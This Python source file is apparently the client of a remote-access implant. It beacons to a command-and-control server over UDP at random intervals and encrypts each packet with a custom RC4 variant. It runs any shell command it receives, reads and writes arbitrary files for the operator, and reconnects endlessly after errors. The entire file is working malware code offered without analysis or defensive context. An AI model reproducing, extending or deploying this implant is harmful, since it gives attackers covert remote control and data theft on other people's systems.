import socket
import subprocess
import time
import select
import sys
import random
import struct
import hashlib

# Global protocol values
START_OF_PACKET = struct.pack("I", 0xFF1337FF)
END_OF_PACKET   = struct.pack("I", 0xED0F9AC7)
END_OF_DATA     = struct.pack("I", 0xED0FDA7A)
MISSING_PACKETS = struct.pack("I", 0x15516ACE)
PACKET_NUM_LEN  = len(struct.pack("I", 0x0))
RC4_KEY_LEN     = len(struct.pack("I", 0x0))
MAX_DATA_SIZE   = 4096
MIN_PACKET_SIZE = 500
MAX_PACKET_SIZE = MAX_DATA_SIZE - len(START_OF_PACKET) - len(END_OF_PACKET) - PACKET_NUM_LEN - RC4_KEY_LEN -len(END_OF_DATA)

# Global "connected" time-out value (before it starts calling out again)
CONNECT_TIMEOUT = 120

#        C2           |           DATAGRAM
#    4          4     |       4        X             4             4
# {RC4 Key}{PACKET #} | {START_OF_PACKET}{DATA}{END_OF_DATA}{END_OF_PACKET}
#
# [12][data][4|8]

# Multiple packet data:
# {START_OF_PACKET}{DATA}{END_OF_PACKET}
# {START_OF_PACKET}{DATA}{END_OF_DATA}{END_OF_PACKET}
### FLAT FILE end of protocol

### FLAT FILE start of rc4
class RC4Twist(object):
    def __init__(self, key, hops=32):
        self.key = bytearray(key)
        self.hops = []
        random.seed(int(hashlib.md5(self.key).hexdigest(),16))
        start = self.RC4(key)
        self._generate_hops(start, hops)
    
    def rekey(self, key, hops):
        self.__init__(key, hops)
    
    def crypt(self, data):
        data = bytearray(data)
        for i,byte in enumerate(data):
            select = random.sample(self.hops,1)[0]
            k = select.next()
            data[i] = byte^k
        return data
    
    def KSA(self, key):
        keylength = len(key)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i%keylength])%256
            S[i],S[j] = S[j],S[i]
        return S
    
    def PRGA(self, S):
        i,j = (0,0)
        while True:
            i = (i+1)%256
            j = (j + S[i])%256
            S[i],S[j] = S[j],S[i]
            K = S[(S[i]+S[j])%256]
            yield K
    
    def RC4(self, key):
        key = bytearray(key)
        return self.PRGA(self.KSA(key))
    
    def _generate_hops(self, start, hops):
        for _ in range(hops):
            scramble = bytearray()
            for char in self.key:
                k = start.next()
                scramble.append(k^char)
            self.hops.append(self.RC4(scramble))

### FLAT FILE end of rc4

class C2(object):
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.addr = 0
        pass
    
    def pack_and_send(self, data, hardcode_packet_num=0):
        """Packs data according to the C2 protocol and sends it to self.addr
           Encrypts per-packet, and sends it out. Packet sizes are random
           between MIN_PACKET_SIZE and MAX_PACKET_SIZE"""
        data = bytearray("{}{}".format(data, END_OF_DATA))
        index = 0
        packet_index = hardcode_packet_num
        data_chunks = dict()
        while index < len(data):
            pktsize = random.randint(MIN_PACKET_SIZE, MAX_PACKET_SIZE)
            packet_number = struct.pack("I", packet_index)
            data_chunk = "{}{}{}{}".format(packet_number, START_OF_PACKET, data[index:index+pktsize], END_OF_PACKET)
            # Encrypt packet
            rc4_key = struct.pack("I", random.randint(0, 0xffffffff))
            crypt = RC4Twist(rc4_key)
            data_chunk = crypt.crypt(data_chunk)
            data_chunk = "{}{}".format(rc4_key, data_chunk)
            # Add to chunk list
            print("send][{}][{}]".format(self.addr,packet_index))
            data_chunks[packet_index] = data_chunk
            self.s.sendto(data_chunk, self.addr)
            # This limits to 20 packets per second. With provided data values, avg communication speed will be ~40kb/s
            index += pktsize
            packet_index += 1
            #time.sleep(0.05)
        return data_chunks

    def unpack(self, data):
        """Removes START_OF_PACKET and END_OF_PACKET from a data_chunk
            Checks for END_OF_DATA to denote end of received data
            returns (data,True) if end of data, else (data,False)"""
        if (data[:len(START_OF_PACKET)] != START_OF_PACKET) or (data[-len(END_OF_PACKET):] != END_OF_PACKET):
            return ("FAILURE",False)
        else:
            data = data[len(START_OF_PACKET):-len(END_OF_PACKET)]
            if data[-len(END_OF_DATA):] == END_OF_DATA:
                # End of data reached
                data = data[:-len(END_OF_DATA)]
                return (data,True)
            else:
                return (data,False)

    def get_packet(self, data_chunk):
        key = data_chunk[:RC4_KEY_LEN]                               # pull out rc4 key
        crypt = RC4Twist(key)                                        # initialize decryption
        data = crypt.crypt(data_chunk[RC4_KEY_LEN:])                 # Decrypt data
        packet_number = struct.unpack("I", data[:PACKET_NUM_LEN])[0] # pull out packet_number
        print("packet_number:{}".format(packet_number))
        data,finished = self.unpack(data[PACKET_NUM_LEN:])           # Unpack data and get if its finished or not
        return (packet_number,data,finished)
    
    def initial_callback(self, delaymin=30, delaymax=120):
        # delay is how many seconds between callback attempts
        delay = random.randint(delaymin, delaymax)
        self.s.setblocking(0)
        while True:
            print("[beacon]")
            self.s.sendto("", self.addr)
            ready = select.select([self.s], [], [], delay)
            if ready[0]:
                # TODO: Remove? This was used as the RC4 Key, but I moved to individual packet encryption
                print("waiting for key")
                key,_ = self.s.recvfrom(MAX_DATA_SIZE)
                print("[key]{}".format(key))
                self.s.setblocking(1)
                break
    
    def _recv(self):
        self.s.setblocking(0)
        print("select]")
        ready = select.select([self.s], [], [], CONNECT_TIMEOUT)
        if ready[0]:
            data,_ = self.s.recvfrom(MAX_DATA_SIZE)
            #print("data]{}".format(repr(data)))
            self.s.setblocking(1)
        else:
            print("BREAK")
            data = "ZZBREAK"
        return data

    def receive_data(self, data_chunks, rerequest=False):
        """ data_chunks must be a dictionary type, and it will be directly modified by this call"""
        while True:
            print("recv]")
            data_chunk = self._recv()
            if data_chunk == "ZZBREAK":
                return False
            if len(data_chunk) == 0:
                print("empty data?")
                continue
            print("recvend]")
            packet_number,unpacked,finished = self.get_packet(data_chunk)
            data_chunks[packet_number] = unpacked # Place data into dictionary
            print("pkt] {}".format(packet_number))
            #print("dict]{}".format(repr([n for n in data_chunks])))
            if finished or rerequest:           # If this is a rerequest, there is no END_OF_DATA so this is a single packet get
                print("RECEIVED LAST PACKET")
                break
        return True
    
    def rerequest_loop(self, data_chunks):
        while True:
            # Get list of missing chunks
            missing = [MISSING_PACKETS]
            for i in range(max(data_chunks)):
                if i not in data_chunks:
                    missing.append(struct.pack("I", i))
            self.send_data(''.join(missing))
            print("Missing]{}".format(missing))
            if len(missing) == 1:
                break
            for i in missing[1:]:
                print("receiving missing]{}".format(repr(i)))
                self.receive_data(data_chunks, True)
    
    def handle_rerequest(self, sent_data):
        data_chunks = dict()
        while True:
            print("rerequest loop]")
            status = self.receive_data(data_chunks)
            if status:
                data = ""
                for i in sorted(data_chunks):
                    data += data_chunks[i]
                print("rerequest]{}".format(repr(data)))
                if data[:len(MISSING_PACKETS)] == MISSING_PACKETS:
                    data = data[len(MISSING_PACKETS):]
                    print("Missing packets]{}".format(repr(data)))
                    if len(data) == 0:
                        print("Done rerequesting")
                        break
                    for i in range(0, len(data), len(MISSING_PACKETS)):
                        missing_index = struct.unpack("I", data[i:len(MISSING_PACKETS)])[0]
                        self.s.sendto(sent_data[missing_index], self.addr)
                else:
                    print("Bad packet data received (rerequest)")
                    break
            else:
                print("Bad status")
                break

    def send_data(self, data):
        print("byte count: {}".format(len(data)))
        data_chunks = self.pack_and_send(data)
        print("Done sending data")
        return data_chunks

class Client(C2):
    def __init__(self, ip="127.0.0.1", port=8000, delaymin=60, delaymax=120):
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self.addr = (ip,port)
                self.initial_callback(120,900)
                self.loop()
            except Exception as e:
                print(str(e))
            except:
                print("Never die!")

    def execute_command(self, command):
        ret = subprocess.check_output(command, shell=True)
        return ret
    
    def file_get(self, filename):
        with open(filename, "rb") as f:
            ret = f.read()
        return ret
    
    def file_put(self, filename, data):
        with open(filename, "wb") as f:
            f.write(data)
        return "done"
    
    def parse_command(self, data):
        print("Received command]{}".format(data))
        if data[0] == ord('!'): # This means execute
            res = self.execute_command(str(data[1:]))
        elif data[0] == ord('u'): # upload from server to client
            filename,data = data[1:].split("\x00",1)
            res = self.file_put(str(filename), data)
        elif data[0] == ord('d'): # download from client to server
            res = self.file_get(str(data[1:]))
        elif data[0] == ord('q'):
            sys.exit()
        else:
            res = "Unknown command"
        return res

    def loop(self):
        while True:
            # Receive data
            data_chunks = dict()
            status = self.receive_data(data_chunks)
            if not status:
                # If receive_data failed, fall back to beaconing (initial callback)
                break
            
            # TODO: Rerequest loop for missing data
            self.rerequest_loop(data_chunks)

            # Do something with data
            data = ""
            for i in sorted(data_chunks):
                data += data_chunks[i]
            try:
                res = self.parse_command(data)
            except:
                res = "fail"

            # Send response
            sent_data = self.send_data(res)
            self.handle_rerequest(sent_data)

if __name__ == "__main__":
    s = Client("127.0.0.1")
